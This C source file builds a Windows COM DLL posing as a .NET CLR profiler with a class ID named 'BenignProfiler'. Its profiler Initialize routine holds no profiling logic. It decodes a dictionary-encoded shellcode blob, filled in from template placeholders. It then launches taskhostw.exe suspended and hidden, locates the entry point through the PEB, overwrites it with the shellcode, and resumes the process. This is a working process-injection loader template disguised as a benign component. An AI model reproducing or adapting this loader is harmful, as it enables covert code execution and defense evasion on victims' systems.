#define CINTERFACE
#define COBJMACROS

#include <windows.h>
#include <winternl.h>
#include <unknwn.h>
#include <string.h>

/* corprof.h expects these normally cor.h-provided metadata declarations. */
typedef LONG32 mdToken;
typedef mdToken mdModule;
typedef mdToken mdTypeDef;
typedef mdToken mdMethodDef;
typedef mdToken mdFieldDef;
typedef ULONG CorElementType;
typedef struct {
    DWORD dwOSPlatformId;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
} OSINFO;
typedef struct {
    USHORT usMajorVersion, usMinorVersion, usBuildNumber, usRevisionNumber;
    LPWSTR szLocale;
    ULONG cbLocale;
    DWORD* rProcessor;
    ULONG ulProcessor;
    OSINFO* rOS;
    ULONG ulOS;
} ASSEMBLYMETADATA;

#include <corprof.h>

/* Profiler class: {A9E5B02A-48D6-4F3E-9D1A-7C06D5F4C8B1}. */
static const CLSID CLSID_BenignProfiler = {
    0xa9e5b02a, 0x48d6, 0x4f3e,
    { 0x9d, 0x1a, 0x7c, 0x06, 0xd5, 0xf4, 0xc8, 0xb1 }
};

/* Kept local so the project does not need CorGuids.lib or uuid.lib. */
static const IID IID_IUnknown_Local = {
    0x00000000, 0x0000, 0x0000,
    { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
};
static const IID IID_IClassFactory_Local = {
    0x00000001, 0x0000, 0x0000,
    { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
};
static const IID IID_Callback = {
    0x176fbed1, 0xa55c, 0x4796,
    { 0x98, 0xca, 0xa9, 0xda, 0x0e, 0xf8, 0x83, 0xe7 }
};
static const IID IID_Callback2 = {
    0x8a8cc829, 0xccf2, 0x49fe,
    { 0xbb, 0xae, 0x0f, 0x02, 0x22, 0x28, 0x07, 0x1a }
};
static const IID IID_Callback3 = {
    0x4fd2ed52, 0x7731, 0x4b8d,
    { 0x94, 0x69, 0x03, 0xd2, 0xcc, 0x30, 0x86, 0xc5 }
};
static const IID IID_ProfilerInfo = {
    0x28b5557d, 0x3f3f, 0x48b4,
    { 0x90, 0xb2, 0x5f, 0x9e, 0xea, 0x2f, 0x6c, 0x48 }
};

typedef struct Profiler {
    ICorProfilerCallback3 iface;
    volatile LONG references;
} Profiler;

typedef struct ClassFactory {
    IClassFactory iface;
    volatile LONG references;
} ClassFactory;

static ULONG STDMETHODCALLTYPE Profiler_AddRef(ICorProfilerCallback3* self);
static ULONG STDMETHODCALLTYPE Profiler_Release(ICorProfilerCallback3* self);

$__ENCRYPTED_SHELLCODE__$
$__DICT__$

#define SHC_LEN (sizeof(dict_words) / sizeof(dict_words[0]))

typedef struct {
    PVOID ExitStatus;
    PVOID PebBaseAddress;
    PVOID AffinityMask;
    PVOID BasePriority;
    ULONG_PTR UniqueProcessId;
    PVOID InheritedFromUniqueProcessId;
} PBI;

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

static HRESULT STDMETHODCALLTYPE Profiler_QueryInterface(
    ICorProfilerCallback3* self, REFIID iid, void** object)
{
    if (object == NULL) return E_POINTER;
    *object = NULL;

    if (IsEqualIID(iid, &IID_IUnknown_Local) ||
        IsEqualIID(iid, &IID_Callback) ||
        IsEqualIID(iid, &IID_Callback2) ||
        IsEqualIID(iid, &IID_Callback3)) {
        *object = self;
        Profiler_AddRef(self);
        return S_OK;
    }
    return E_NOINTERFACE;
}

static ULONG STDMETHODCALLTYPE Profiler_AddRef(ICorProfilerCallback3* self)
{
    return (ULONG)InterlockedIncrement(&((Profiler*)self)->references);
}

static ULONG STDMETHODCALLTYPE Profiler_Release(ICorProfilerCallback3* self)
{
    Profiler* profiler = (Profiler*)self;
    LONG remaining = InterlockedDecrement(&profiler->references);
    if (remaining == 0) HeapFree(GetProcessHeap(), 0, profiler);
    return (ULONG)remaining;
}

static HRESULT STDMETHODCALLTYPE Profiler_Initialize(
    ICorProfilerCallback3* self, IUnknown* info_unknown)
{
    ICorProfilerInfo* info = NULL;
    HRESULT result;
    (void)self;

    if (info_unknown == NULL) return E_POINTER;
    result = IUnknown_QueryInterface(
        info_unknown, &IID_ProfilerInfo, (void**)&info);
    if (FAILED(result)) return result;

    result = ICorProfilerInfo_SetEventMask(info, COR_PRF_MONITOR_NONE);
    ICorProfilerInfo_Release(info);
    if (FAILED(result)) return result;


    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    PBI pbi = { 0 };
    pNtQueryInformationProcess NtQIP;
    BYTE shc[SHC_LEN];
    BYTE headers[0x200];
    PVOID imageBase = NULL;
    DWORD ret = 0, e_lfanew, rva;
    SIZE_T n = 0;
    size_t i, b;
    char cmd[] = "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}";

    si.cb = sizeof(si);
    for (i = 0; i < SHC_LEN; i++)
        for (b = 0; b < 256; b++)
            if (!strcmp(translate_dict[b], dict_words[i])) {
                shc[i] = (BYTE)b;
                break;
            }

    if (!CreateProcessA("C:\\Windows\\System32\\taskhostw.exe", cmd, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, "C:\\WINDOWS\\System32\\", &si, &pi))
        return E_FAIL;

    NtQIP = (pNtQueryInformationProcess)(void*)GetProcAddress(GetModuleHandleA("ntdll.dll"),
        "NtQueryInformationProcess");
    if (!NtQIP || NtQIP(pi.hProcess, 0, &pbi, (ULONG)sizeof(pbi), &ret) != 0)
        return E_FAIL;

    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBase, sizeof(imageBase), &n) ||
        !ReadProcessMemory(pi.hProcess, imageBase, headers, sizeof(headers), &n))
        return E_FAIL;

    e_lfanew = *(DWORD*)(headers + 0x3C);
    rva = *(DWORD*)(headers + e_lfanew + 0x28);

    if (!WriteProcessMemory(pi.hProcess, (PBYTE)imageBase + rva, shc, sizeof(shc), &n))
        return E_FAIL;

    ResumeThread(pi.hThread);
    return S_OK;

}

static HRESULT STDMETHODCALLTYPE Profiler_Shutdown(ICorProfilerCallback3* self)
{
    (void)self;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE Profiler_InitializeForAttach(
    ICorProfilerCallback3* self, IUnknown* info, void* data, UINT data_size)
{
    (void)self; (void)info; (void)data; (void)data_size;
    return E_NOTIMPL;
}

static HRESULT STDMETHODCALLTYPE Profiler_AttachComplete(ICorProfilerCallback3* self)
{
    (void)self;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE Profiler_DetachSucceeded(ICorProfilerCallback3* self)
{
    (void)self;
    return S_OK;
}

/*
 * The unlisted event slots are NULL because the event mask is always NONE.
 * Add correctly typed handlers before enabling any profiling notifications.
 */
static ICorProfilerCallback3Vtbl Profiler_VTable = {
    .QueryInterface = Profiler_QueryInterface,
    .AddRef = Profiler_AddRef,
    .Release = Profiler_Release,
    .Initialize = Profiler_Initialize,
    .Shutdown = Profiler_Shutdown,
    .InitializeForAttach = Profiler_InitializeForAttach,
    .ProfilerAttachComplete = Profiler_AttachComplete,
    .ProfilerDetachSucceeded = Profiler_DetachSucceeded
};

static ULONG STDMETHODCALLTYPE Factory_AddRef(IClassFactory* self);
static ULONG STDMETHODCALLTYPE Factory_Release(IClassFactory* self);

static HRESULT STDMETHODCALLTYPE Factory_QueryInterface(
    IClassFactory* self, REFIID iid, void** object)
{
    if (object == NULL) return E_POINTER;
    *object = NULL;

    if (IsEqualIID(iid, &IID_IUnknown_Local) ||
        IsEqualIID(iid, &IID_IClassFactory_Local)) {
        *object = self;
        Factory_AddRef(self);
        return S_OK;
    }
    return E_NOINTERFACE;
}

static ULONG STDMETHODCALLTYPE Factory_AddRef(IClassFactory* self)
{
    return (ULONG)InterlockedIncrement(&((ClassFactory*)self)->references);
}

static ULONG STDMETHODCALLTYPE Factory_Release(IClassFactory* self)
{
    ClassFactory* factory = (ClassFactory*)self;
    LONG remaining = InterlockedDecrement(&factory->references);
    if (remaining == 0) HeapFree(GetProcessHeap(), 0, factory);
    return (ULONG)remaining;
}

static HRESULT STDMETHODCALLTYPE Factory_CreateInstance(
    IClassFactory* self, IUnknown* outer, REFIID iid, void** object)
{
    Profiler* profiler;
    HRESULT result;
    (void)self;

    if (object == NULL) return E_POINTER;
    *object = NULL;
    if (outer != NULL) return CLASS_E_NOAGGREGATION;

    profiler = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*profiler));
    if (profiler == NULL) return E_OUTOFMEMORY;
    profiler->iface.lpVtbl = &Profiler_VTable;
    profiler->references = 1;

    result = Profiler_QueryInterface(&profiler->iface, iid, object);
    Profiler_Release(&profiler->iface);
    return result;
}

static HRESULT STDMETHODCALLTYPE Factory_LockServer(IClassFactory* self, BOOL lock)
{
    (void)self; (void)lock;
    return S_OK;
}

static IClassFactoryVtbl Factory_VTable = {
    Factory_QueryInterface,
    Factory_AddRef,
    Factory_Release,
    Factory_CreateInstance,
    Factory_LockServer
};

HRESULT __stdcall DllGetClassObject(
    REFCLSID class_id, REFIID iid, void** object)
{
    ClassFactory* factory;
    HRESULT result;

    if (object == NULL) return E_POINTER;
    *object = NULL;
    if (!IsEqualCLSID(class_id, &CLSID_BenignProfiler))
        return CLASS_E_CLASSNOTAVAILABLE;

    factory = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*factory));
    if (factory == NULL) return E_OUTOFMEMORY;
    factory->iface.lpVtbl = &Factory_VTable;
    factory->references = 1;

    result = Factory_QueryInterface(&factory->iface, iid, object);
    Factory_Release(&factory->iface);
    return result;
}

HRESULT __stdcall DllCanUnloadNow(void)
{
    return S_FALSE;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(instance);
    return TRUE;
}
